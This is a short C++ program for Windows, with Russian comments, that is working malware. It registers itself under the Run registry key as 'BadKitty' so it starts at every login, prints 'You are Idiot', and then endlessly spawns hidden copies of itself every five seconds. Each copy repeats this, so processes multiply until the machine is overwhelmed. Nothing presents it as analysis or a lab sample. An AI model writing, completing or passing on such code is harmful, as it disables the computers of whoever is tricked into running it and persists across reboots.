#include <iostream>
#include <windows.h>
#include <string>
#include <cstdlib> // Для использования GetModuleFileName
using namespace std;

// Функция для добавления программы в автозагрузку
void addToStartup(const string& programPath) {
    HKEY hKey;
    // Открываем реестр для добавления в автозагрузку
    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "BadKitty", 0, REG_SZ, (BYTE*)programPath.c_str(), programPath.length() + 1);
        RegCloseKey(hKey);
    }
}

// Функция для получения пути к текущему исполняемому файлу
string getProgramPath() {
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH); // Получаем путь текущего исполняемого файла
    return string(buffer);
}

// Функция для запуска скрытого процесса
void startHiddenProcess(const string& programPath) {
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    // Запуск скрытого процесса
    if (CreateProcess(
        programPath.c_str(), // Путь к программе
        NULL,                // Аргументы командной строки
        NULL,                // Безопасность
        NULL,                // Безопасность дочернего процесса
        FALSE,               // Без наследования дескрипторов
        CREATE_NO_WINDOW,    // Без окна
        NULL,                // Среда
        NULL,                // Текущий каталог
        &si,                 // Информация о старте
        &pi)) {              // Информация о процессе
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

int main() {
    // Получаем путь к текущей программе
    string programPath = getProgramPath();
    printf("You are Idiot\n");
    // Добавляем в автозагрузку
    addToStartup(programPath);

    // Запускаем программу скрытно
    while (true) {
        startHiddenProcess(programPath);
        Sleep(5000); // Запуск нового экземпляра каждые 5 секунд
    }

    return 0;
}
